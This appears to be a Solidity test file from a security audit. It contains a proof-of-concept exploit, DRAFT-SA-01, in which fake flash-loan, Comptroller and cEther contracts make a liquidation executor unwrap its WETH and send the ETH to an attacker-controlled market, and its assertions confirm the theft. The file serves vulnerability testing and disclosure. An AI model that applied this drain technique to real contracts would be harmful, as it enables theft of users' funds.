// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {ExecutorTestBase} from "../unit/Base.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {MockERC20} from "../unit/Mocks.sol";

interface IUniV3FlashCb {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

contract FakeUniV3FlashWeth {
    function flash(address recipient, uint256, uint256, bytes calldata data) external {
        IUniV3FlashCb(recipient).uniswapV3FlashCallback(0, 0, data);
    }

    function token0() external pure returns (address) {
        return address(0);
    }
}

contract FakeComptroller {
    function getAccountLiquidity(address)
        external
        pure
        returns (uint256 err, uint256 liquidity, uint256 shortfall)
    {
        return (0, 0, 1);
    }

    function isDeprecated(address) external pure returns (bool) {
        return false;
    }
}

contract FakeCEther {
    FakeComptroller public immutable comptroller;

    constructor(FakeComptroller c) {
        comptroller = c;
    }

    function liquidateBorrow(address, address) external payable {}
}

/*
 * DRAFT-SA-01: Compound isCEther unwraps WETH and sends ETH to plan `market`.
 * Group1: real Aave liq → coll; Group2: fake cEther drains standing WETH as ETH;
 * then profit coll→WETH so gross still clears (steal ≤ profit).
 */
contract CompoundCEtherEthDrainPoC is ExecutorTestBase {
    FakeUniV3FlashWeth internal fakeFlash;
    FakeComptroller internal unitroller;
    FakeCEther internal fakeCeth;
    MockERC20 internal cTokenColl;

    uint256 internal constant STEAL = 0.05e18;

    function setUp() public override {
        super.setUp();
        fakeFlash = new FakeUniV3FlashWeth();
        unitroller = new FakeComptroller();
        fakeCeth = new FakeCEther(unitroller);
        cTokenColl = new MockERC20("cCOLL", 8);
    }

    function test_poc_compound_cether_eth_to_plan_market() public {
        // 2*STEAL: one for ETH siphon, one for fake-flash WETH repay.
        weth.mint(address(ex), STEAL * 2);
        vm.deal(address(weth), address(weth).balance + STEAL * 2);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 2),
            // Group 1 — real Aave liquidation funding coll for later WETH profit.
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            // Group 2 — WETH fake flash + Compound isCEther → ETH to FakeCEther.
            PB.groupHead(PB.P_UNIV3, address(fakeFlash), address(weth), uint128(STEAL), 1, 0),
            PB.legCompound(address(fakeCeth), borrower, address(coll), uint128(STEAL), address(cTokenColl), 1),
            PB.profit(1, _profitLeg())
        );

        uint256 ethBefore = address(fakeCeth).balance;
        _exec(plan);
        assertEq(address(fakeCeth).balance - ethBefore, STEAL, "fake cEther received ETH");
        assertGt(weth.balanceOf(address(ex)), 0, "WETH profit remains after steal");
    }
}
